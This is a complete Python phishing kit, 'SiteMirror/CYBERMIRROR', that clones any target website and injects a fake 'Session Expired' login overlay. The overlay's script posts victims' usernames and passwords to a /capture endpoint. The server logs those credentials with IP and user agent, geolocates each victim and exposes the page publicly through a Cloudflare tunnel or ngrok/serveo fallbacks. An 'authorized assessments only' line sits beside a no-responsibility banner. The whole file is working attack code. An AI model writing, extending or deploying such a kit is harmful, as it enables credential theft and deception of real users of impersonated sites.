#!/usr/bin/env python3
"""
SiteMirror — Website Cloning & Phishing Deployment Tool
For authorized security assessments only.
Usage: python3 sitemirror.py
"""

import os
import sys
import re
import json
import time
import socket
import threading
import requests
import subprocess
from urllib.parse import urlparse, urljoin
from http.server import HTTPServer, BaseHTTPRequestHandler
from bs4 import BeautifulSoup

GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
CYAN = "\033[96m"
BOLD = "\033[1m"
DIM = "\033[2m"
END = "\033[0m"

LOCAL_PORT = 8080
CLONE_DIR = "cloned_site"
CAPTURE_FILE = "captures.json"

class SiteCloner:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.parsed = urlparse(self.target_url)
        self.domain = self.parsed.netloc
        self.base_dir = os.path.join(CLONE_DIR, self.domain)
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        self.downloaded = set()

    def clone(self):
        print(GREEN + "[+] Cloning: " + self.target_url + END)
        os.makedirs(self.base_dir, exist_ok=True)

        html = self.download_page(self.target_url)
        if not html:
            print(RED + "[-] Failed to download target" + END)
            return None

        html = self.inject_capture(html)

        index_path = os.path.join(self.base_dir, 'index.html')
        with open(index_path, 'w', encoding='utf-8') as f:
            f.write(html)
        print(GREEN + "[+] Saved: index.html" + END)

        self.download_assets(html, self.target_url)
        print(GREEN + "[+] Clone complete in: " + self.base_dir + END)
        return self.base_dir

    def download_page(self, url):
        if url in self.downloaded:
            return None
        self.downloaded.add(url)
        try:
            r = self.session.get(url, timeout=15, verify=False)
            if r.status_code == 200:
                return r.text
            else:
                print(DIM + "  [!] HTTP " + str(r.status_code) + " for " + url + END)
        except Exception as e:
            print(DIM + "  [!] Failed: " + url + " - " + str(e)[:50] + END)
        return None

    def download_asset(self, url):
        if url in self.downloaded or not url.startswith('http'):
            return None
        self.downloaded.add(url)
        try:
            r = self.session.get(url, timeout=10, verify=False)
            if r.status_code == 200:
                parsed = urlparse(url)
                path = parsed.path.lstrip('/')
                if not path or path.endswith('/'):
                    path = path + 'index.html'
                save_path = os.path.join(self.base_dir, path)
                os.makedirs(os.path.dirname(save_path), exist_ok=True)
                content_type = r.headers.get('Content-Type', '')
                if 'image' in content_type or 'font' in content_type or 'octet-stream' in content_type:
                    with open(save_path, 'wb') as f:
                        f.write(r.content)
                else:
                    with open(save_path, 'w', encoding='utf-8', errors='ignore') as f:
                        f.write(r.text)
                return save_path
        except:
            pass
        return None

    def download_assets(self, html, base_url):
        soup = BeautifulSoup(html, 'html.parser')
        for tag in soup.find_all(['link', 'script', 'img', 'source']):
            attr = 'href' if tag.name == 'link' else 'src'
            url = tag.get(attr)
            if not url:
                continue
            full_url = urljoin(base_url, url)
            if self.parsed.netloc not in full_url:
                continue
            self.download_asset(full_url)

    def inject_capture(self, html):
        capture_script = """
<style>
#sm-overlay {
    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
    background: rgba(0,0,0,0.6); z-index: 999999;
    display: flex; align-items: center; justify-content: center;
}
#sm-modal {
    background: white; padding: 30px; border-radius: 12px;
    max-width: 400px; width: 90%; box-shadow: 0 10px 40px rgba(0,0,0,0.3);
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
}
#sm-modal h2 { margin: 0 0 5px 0; font-size: 20px; }
#sm-modal p { color: #666; margin: 0 0 20px 0; font-size: 14px; }
#sm-modal input {
    display: block; width: 100%; padding: 12px; margin: 8px 0;
    border: 1px solid #ddd; border-radius: 6px; font-size: 14px;
    box-sizing: border-box;
}
#sm-modal button {
    width: 100%; padding: 12px; background: #0095f6; color: white;
    border: none; border-radius: 6px; font-size: 14px; font-weight: 600;
    cursor: pointer; margin-top: 8px;
}
#sm-modal button:hover { opacity: 0.9; }
.sm-hidden { display: none !important; }
</style>
<div id="sm-overlay" class="sm-hidden">
    <div id="sm-modal">
        <h2>Session Expired</h2>
        <p>Please log in again to continue.</p>
        <form id="sm-form">
            <input type="text" id="sm-user" placeholder="Phone number, username, or email" required>
            <input type="password" id="sm-pass" placeholder="Password" required>
            <button type="submit">Log In</button>
            <p id="sm-error" style="color:red;display:none;text-align:center;margin-top:12px;">
                Wrong password. Try again.
            </p>
        </form>
    </div>
</div>
<script>
setTimeout(function() {
    document.getElementById('sm-overlay').classList.remove('sm-hidden');
}, 2000);

document.getElementById('sm-form').addEventListener('submit', function(e) {
    e.preventDefault();
    var u = document.getElementById('sm-user').value;
    var p = document.getElementById('sm-pass').value;
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/capture', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.onload = function() {
        document.getElementById('sm-error').style.display = 'block';
        document.getElementById('sm-pass').value = '';
    };
    xhr.send(JSON.stringify({username: u, password: p, url: window.location.href, ua: navigator.userAgent, timestamp: new Date().toISOString()}));
});
</script>
"""
        if '</body>' in html:
            html = html.replace('</body>', capture_script + '\n</body>')
        else:
            html += capture_script
        return html


class CloneHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        path = self.path
        if path == '/' or path == '':
            path = '/index.html'
        
        file_path = os.path.join(CLONE_DIR, self.server.target_domain, path.lstrip('/'))
        
        if os.path.exists(file_path) and os.path.isfile(file_path):
            ext = os.path.splitext(file_path)[1].lower()
            types = {
                '.html': 'text/html; charset=utf-8',
                '.css': 'text/css',
                '.js': 'application/javascript',
                '.png': 'image/png',
                '.jpg': 'image/jpeg',
                '.jpeg': 'image/jpeg',
                '.gif': 'image/gif',
                '.svg': 'image/svg+xml',
                '.ico': 'image/x-icon',
                '.woff': 'font/woff',
                '.woff2': 'font/woff2',
                '.ttf': 'font/ttf',
            }
            ctype = types.get(ext, 'application/octet-stream')
            
            self.send_response(200)
            self.send_header('Content-Type', ctype)
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            with open(file_path, 'rb') as f:
                self.wfile.write(f.read())
        else:
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.end_headers()
            idx = os.path.join(CLONE_DIR, self.server.target_domain, 'index.html')
            if os.path.exists(idx):
                with open(idx, 'rb') as f:
                    self.wfile.write(f.read())
            else:
                self.wfile.write(b'<h1>Page not found</h1>')

    def do_POST(self):
        if self.path == '/capture':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            try:
                data = json.loads(post_data.decode())
                
                cf = self.headers.get('CF-Connecting-IP')
                forwarded = self.headers.get('X-Forwarded-For')
                target_ip = cf or forwarded or self.client_address[0]
                data['ip'] = target_ip
                
                print("")
                print("=" * 60)
                print(GREEN + BOLD + "[+] CREDENTIALS CAPTURED!" + END)
                print(BOLD + "=" * 60 + END)
                print("  " + CYAN + "IP:" + END + "           " + YELLOW + target_ip + END)
                print("  " + CYAN + "Username:" + END + "     " + data.get('username', 'N/A'))
                print("  " + CYAN + "Password:" + END + "     " + data.get('password', 'N/A'))
                print("  " + CYAN + "URL:" + END + "          " + data.get('url', 'N/A'))
                print("  " + CYAN + "Timestamp:" + END + "    " + data.get('timestamp', 'N/A'))
                print(BOLD + "=" * 60 + END)
                
                with open(CAPTURE_FILE, 'a') as f:
                    f.write(json.dumps(data, indent=2) + '\n---\n')
                
                try:
                    r = requests.get("http://ip-api.com/json/" + target_ip, timeout=5)
                    if r.status_code == 200:
                        geo = r.json()
                        if geo['status'] == 'success':
                            print("  " + DIM + "[Location] " + geo.get('city','?') + ", " + geo.get('country','?') + " | " + geo.get('isp','?') + END)
                except:
                    pass
                
                print("=" * 60)
                
            except Exception:
                pass
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'ok'}).encode())
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        pass


class CustomServer(HTTPServer):
    def __init__(self, *args, **kwargs):
        self.target_domain = kwargs.pop('target_domain', '')
        HTTPServer.__init__(self, *args, **kwargs)


def get_cloudflared():
    try:
        subprocess.run(['cloudflared', '--version'], capture_output=True, check=True)
        return 'cloudflared'
    except Exception:
        pass
    for p in ['/usr/local/bin/cloudflared', '/usr/bin/cloudflared', '/tmp/cloudflared']:
        if os.path.exists(p):
            return p
    print(YELLOW + "[*] Downloading cloudflared..." + END)
    try:
        subprocess.run(['wget', '-q', 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64', '-O', '/tmp/cloudflared'])
        os.chmod('/tmp/cloudflared', 0o755)
        print(GREEN + "[+] Downloaded" + END)
        return '/tmp/cloudflared'
    except Exception:
        return None


def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return '127.0.0.1'


def start_tunnel(target_domain):
    cf_path = get_cloudflared()
    if not cf_path:
        print(RED + "[-] cloudflared not available" + END)
        return None
    
    print(YELLOW + "[*] Starting Cloudflare tunnel..." + END)
    
    for attempt in range(3):
        proc = subprocess.Popen(
            [cf_path, 'tunnel', '--url', 'http://localhost:' + str(LOCAL_PORT)],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            universal_newlines=True
        )
        
        for line in proc.stdout:
            print("  " + DIM + line.strip()[:120] + END)
            if '.trycloudflare.com' in line:
                m = re.search(r'(https://[a-zA-Z0-9\-]+\.trycloudflare\.com)', line)
                if m:
                    url = m.group(1)
                    print()
                    print("=" * 60)
                    print(GREEN + BOLD + "[+] PHISHING PAGE LIVE!" + END)
                    print(BOLD + "=" * 60 + END)
                    print("  " + YELLOW + BOLD + url + END)
                    print(BOLD + "=" * 60 + END)
                    print("  Target: " + target_domain)
                    print("  Waiting for credentials...")
                    print("  " + DIM + "Press CTRL+C to stop" + END)
                    print("=" * 60)
                    print()
                    return proc
        
        print(YELLOW + "[!] Tunnel attempt " + str(attempt + 1) + " failed, retrying..." + END)
        try:
            proc.kill()
        except Exception:
            pass
        time.sleep(3)
    
    print(RED + "[-] Cloudflare tunnel failed after 3 attempts" + END)
    return None


def main():
    print(RED + BOLD)
    print("╔══════════════════════════════════════════════════╗")
    print("║          CYBERMIRROR SITE CLONER                 ║")
    print("║                                                  ║")
    print("║ Author- CYBER_ANXHU                              ║")
    print("║                                                  ║")
    print("║ WARNING!!- Creator is not responsible for any    ║")
    print("║            harm caused by the use of this tool.  ║")
    print("║            Use it at your own risk !!!!!         ║")
    print("║                                                  ║")
    print("║                                                  ║")
    print("╚══════════════════════════════════════════════════╝")
    print(END)

    target = input(CYAN + "[?]" + END + " Enter target URL to clone: ").strip()
    if not target:
        print(RED + "[-] No URL provided" + END)
        return

    print()
    cloner = SiteCloner(target)
    clone_dir = cloner.clone()
    
    if not clone_dir:
        print(RED + "[-] Cloning failed" + END)
        return

    server = CustomServer(('0.0.0.0', LOCAL_PORT), CloneHandler, target_domain=cloner.domain)
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()
    print(GREEN + "[+] Server running: http://0.0.0.0:" + str(LOCAL_PORT) + END)

    time.sleep(1)

    tunnel_proc = start_tunnel(cloner.domain)
    
    if not tunnel_proc:
        local_ip = get_local_ip()
        print()
        print("=" * 60)
        print(YELLOW + BOLD + "[!] TUNNEL FAILED - USING LOCAL NETWORK" + END)
        print(BOLD + "=" * 60 + END)
        print("  " + CYAN + "Local URL:" + END + "    http://" + local_ip + ":" + str(LOCAL_PORT))
        print("  " + CYAN + "Localhost:" + END + "    http://127.0.0.1:" + str(LOCAL_PORT))
        print()
        print("  " + YELLOW + "For external access, try:" + END)
        print("  " + DIM + "  - ngrok http " + str(LOCAL_PORT) + END)
        print("  " + DIM + "  - ssh -R 80:localhost:" + str(LOCAL_PORT) + " nokey@localhost.run" + END)
        print("  " + DIM + "  - ssh -R 80:localhost:" + str(LOCAL_PORT) + " serveo.net" + END)
        print(BOLD + "=" * 60 + END)
        print("  Target: " + cloner.domain)
        print("  Waiting for credentials...")
        print("  " + DIM + "Press CTRL+C to stop" + END)
        print("=" * 60)
        print()
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print()
            print(YELLOW + "[!] Shutting down..." + END)
            server.shutdown()
            sys.exit(0)
    else:
        try:
            tunnel_proc.wait()
        except KeyboardInterrupt:
            print()
            print(YELLOW + "[!] Shutting down..." + END)
            try:
                tunnel_proc.kill()
            except Exception:
                pass
            server.shutdown()
            sys.exit(0)


if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    main()
